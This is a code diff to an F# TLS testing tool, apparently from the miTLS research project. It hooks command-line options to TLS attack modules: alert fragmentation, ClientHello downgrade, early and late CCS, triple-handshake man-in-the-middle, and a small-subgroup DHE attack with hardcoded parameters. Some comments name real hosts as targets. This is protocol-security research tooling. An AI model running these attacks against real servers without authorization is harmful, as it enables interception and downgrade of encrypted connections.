@@ -154,13 +154,40 @@ let main argv =
         // Attacks
         | Some(Attack) ->
             (match opts.attack with
-            | Some (FragmentedAlert)        -> eprintf "ATTACK\n"
-            | Some (MalformedAlert)         -> eprintf "ATTACK\n"
-            | Some (FragmentedClientHello)  -> eprintf "ATTACK\n"
-            | Some (EarlyCCS)               -> eprintf "ATTACK\n"
-            | Some (LateCCS)                -> eprintf "ATTACK\n"
-            | Some (TripleHandshake)        -> eprintf "ATTACK\n"
-            | Some (SmallSubgroup)          -> eprintf "ATTACK\n"
+            | Some (FragmentedAlert) -> 
+                let st = Attack_Alert.run(connect_addr, connect_port) in ()
+            
+            | Some (MalformedAlert) -> 
+                let st = Handshake_full_alert_RSA.client(connect_addr,connect_port) in ()
+
+            | Some (FragmentedClientHello) -> 
+                let st = Attack_FragmentClientHello.run(connect_addr,fp=All(5)) in ()
+
+            | Some (EarlyCCS) ->
+                let sst,cst = Attack_EarlyCCS.runMITM(listen_addr,connect_addr,listen_port,connect_port) in ()
+
+            | Some (LateCCS) ->
+                let _ = LateCCS.server(listen_addr,listen_port) in ()
+                
+            | Some (TripleHandshake) ->
+                let sst,cst = Attack_TripleHandshake.runMITM(listen_addr,listen_cert,listen_port,connect_addr,connect_port) in ()
+
+            | Some (SmallSubgroup) ->
+                    // Test with local OpenSSL server using MODP 1024-bit group:
+                    // $ openssl s_server -accept 443 -dhparam modp1024.pem
+                    //
+                    // -----BEGIN DH PARAMETERS-----
+                    // MIIBCAKBgQCxC4+WoIDgHd6S3l6uXVTsUsmfvPsGo8aaap3KUtI7YWBz4oZ1oj0Y
+                    // mDjvHi7mUsAT7LSuqQYRIySXXDzUm4O/rMvdfZDEvXCYSI6cIZpzck7/1vrlZEc4
+                    // +qMaT/VbzMChUa9fDci0vUW/N982XBpl5oz9p21NpwjfH7K8LkpDcQKBgQCk0cvV
+                    // w/00EmdlpELvuZkF+BBN0lisUH/WQGz/FCZtMSZv6h5cQVZLd35pD1UE8hMWAhe0
+                    // sBuIal6RVH+eJ0n01/vX07mpLuGQnQ0iY/gKdqaiTAh6CR9THb8KAWm2oorWYqTR
+                    // jnOvoy13nVkY0IvIhY9Nzvl8KiSFXm7rIrOy5Q==
+                    // -----END DH PARAMETERS-----
+                    //
+                    Attack_SmallSubgroup_DHE.run(true, 223,
+                           "124325339146889384540494091085456630009856882741872806181731279018491820800119460022367403769795008250021191767583423221479185609066059226301250167164084041279837566626881119772675984258163062926954046545485368458404445166682380071370274810671501916789361956272226105723317679562001235501455748016154805420913",
+                           "223",connect_addr)
             )
         )
     in
@@ -188,15 +215,8 @@ let main argv =
 
 ////////////////////////////////////////////////////////////////////////////////////////////////
 
-    (* Alert attack *)
-//    let st = Attack_Alert.run "www.google.com" in
-
     (* Alert attack MITM *)
 //    let sst,cst = Attack_Alert.runMITM("0.0.0.0","127.0.0.1",4433) in
-
-    (* Protocol downgrade attack (Fragmented ClientHello) *)
-//    let st = Attack_FragmentClientHello.run("www.inria.fr",fp=All(5)) in
-//    printf "Protocol version downgrade attack finished\n";
 
     (* Protocol downgrade attack MITM (Fragmented ClientHello) *)
 //    let sst,cst = Attack_FragmentClientHello.runMITM("0.0.0.0","127.0.0.1",4433) in
@@ -209,37 +229,9 @@ let main argv =
     (* Early Resume attack *)
 //    let st = Attack_EarlyResume.run("test_CN",6443) in
 
-    (* Java Late CCS attack as Server *)
-//    let sst,cst = LateCCS.server("0.0.0.0") in
-//    printf "Java Late CCS attack finished\n";
-
     (* Java Late CCS attack MITM *)
 //    let sst,cst = LateCCS.runMITM("www.inria.fr") in
 //    printf "Java Late CCS attack finished\n";
-
-    (* Triple handshake attack MITM *)
-//    let sst,cst = Attack_TripleHandshake.runMITM("0.0.0.0","rsa.cert-01.mitls.org",6666,"127.0.0.1",4433) in
-//    printf "Triple handshake attack finished\n";
-
-    (* Small subgroup attack for DHE *)
-//    ignore(LogManager.DisableLogging());
-//    // Test with local OpenSSL server using MODP 1024-bit group:
-//    // $ openssl s_server -accept 443 -dhparam modp1024.pem
-//    //
-//    // -----BEGIN DH PARAMETERS-----
-//    // MIIBCAKBgQCxC4+WoIDgHd6S3l6uXVTsUsmfvPsGo8aaap3KUtI7YWBz4oZ1oj0Y
-//    // mDjvHi7mUsAT7LSuqQYRIySXXDzUm4O/rMvdfZDEvXCYSI6cIZpzck7/1vrlZEc4
-//    // +qMaT/VbzMChUa9fDci0vUW/N982XBpl5oz9p21NpwjfH7K8LkpDcQKBgQCk0cvV
-//    // w/00EmdlpELvuZkF+BBN0lisUH/WQGz/FCZtMSZv6h5cQVZLd35pD1UE8hMWAhe0
-//    // sBuIal6RVH+eJ0n01/vX07mpLuGQnQ0iY/gKdqaiTAh6CR9THb8KAWm2oorWYqTR
-//    // jnOvoy13nVkY0IvIhY9Nzvl8KiSFXm7rIrOy5Q==
-//    // -----END DH PARAMETERS-----
-//    //
-//    Attack_SmallSubgroup_DHE.run(true, 223,
-//           "124325339146889384540494091085456630009856882741872806181731279018491820800119460022367403769795008250021191767583423221479185609066059226301250167164084041279837566626881119772675984258163062926954046545485368458404445166682380071370274810671501916789361956272226105723317679562001235501455748016154805420913",
-//           "223",
-//           "localhost");
-//    ignore(LogManager.EnableLogging());
 
 ////////////////////////////////////////////////////////////////////////////////////////////////
 
